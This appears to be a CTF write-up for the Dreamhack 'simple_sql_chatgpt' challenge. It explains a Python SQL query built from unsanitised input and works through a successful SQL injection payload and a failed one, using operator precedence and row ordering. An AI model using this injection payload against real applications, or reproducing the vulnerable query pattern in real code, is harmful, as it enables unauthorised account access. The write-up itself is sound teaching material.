---
title: "[Dreamhack] simple_sql_chatgpt"
date: 2026-04-11 15:00:00 +1100
categories: [CTF Writeup, Web Hacking]
tags: [dreamhack, sql_injection]     # TAG names should always be lowercase
---
## Challenge Overview
- Challenge: simple_sql_chatgpt
- Platform: Dreamhack
- Category: Web — SQL injection


## Vulnerable Query

The application constructs an SQL query using unsanitised user input:

``` python
res = query_db(f"select * from users where userlevel='{userlevel}'")
```

Resulting SQL:

``` sql
SELECT * FROM users WHERE userlevel = '[input]'
```

Because the `userlevel` parameter is directly embedded into the query,
it is vulnerable to SQL injection.


## Successful Payload

``` sql
' OR '1'='1' AND userid = 'admin' --
```

### Resulting Query

``` sql
SELECT * FROM users 
WHERE userlevel = '' OR '1'='1' AND userid = 'admin' -- '
```

### Interpretation (Operator Precedence)

``` sql
userlevel = '' 
OR ('1'='1' AND userid = 'admin')
```

Since `AND` has higher precedence than `OR`, the condition is evaluated
as above.

-   `'1'='1'` → TRUE\
-   `userid = 'admin'` → TRUE (only for admin)

Therefore:

``` sql
FALSE OR (TRUE AND TRUE) → TRUE
```

Only the admin row satisfies the condition.

The application retrieves the first result:

``` python
return (rv[0] if rv else None)
```

Since only the admin row is returned, the following condition is
satisfied:

``` python
if userid == 'admin' and userlevel == 0:
```

As a result, the flag is returned.



## Failed Payload

``` sql
0' OR '1'='1' AND userid = 'admin' --
```

### Resulting Query

``` sql
SELECT * FROM users 
WHERE userlevel = '0' OR '1'='1' AND userid = 'admin' -- '
```

### Interpretation

``` sql
(userlevel = '0') 
OR ('1'='1' AND userid = 'admin')
```



## Evaluation

### Guest Row

``` text
userid = 'guest'
userlevel = 0
```

``` sql
(userlevel = '0') → TRUE
('1'='1' AND userid = 'admin') → FALSE
TRUE OR FALSE → TRUE
```

### Admin Row

``` text
userid = 'admin'
userlevel = 0
```

``` sql
(userlevel = '0') → TRUE
('1'='1' AND userid = 'admin') → TRUE
TRUE OR TRUE → TRUE
```

Both rows satisfy the condition and are returned.



## Why It Fails

The application selects only the first row:

``` python
return (rv[0] if rv else None)
```

SQLite returns rows in insertion order:

``` text
guest → admin
```

So the selected row is:

``` text
guest
```

Therefore:

``` python
userid == 'admin' → FALSE
```

Access to the flag is denied.


## Key Insight

The condition:

``` sql
(userlevel = '0') OR ('1'='1' AND userid = 'admin')
```

means:

-   Any user with `userlevel = 0`
-   OR specifically the admin user

Since both guest and admin have `userlevel = 0`, both are included.

The condition:

``` sql
userid = 'admin'
```

is only applied to the right side of the OR, not globally.


## Summary

``` text
Payload 1:
' OR '1'='1' AND userid = 'admin' --
→ Only admin returned → Success

Payload 2:
0' OR '1'='1' AND userid = 'admin' --
→ Guest + admin returned → guest selected → Failure
```


## Conclusion

This vulnerability arises due to:

-   Unsanitised SQL query construction
-   Misuse of operator precedence
-   Application logic relying on the first returned row

It demonstrates that successful SQL injection depends not only on
bypassing conditions, but also on controlling the result set and its
ordering.

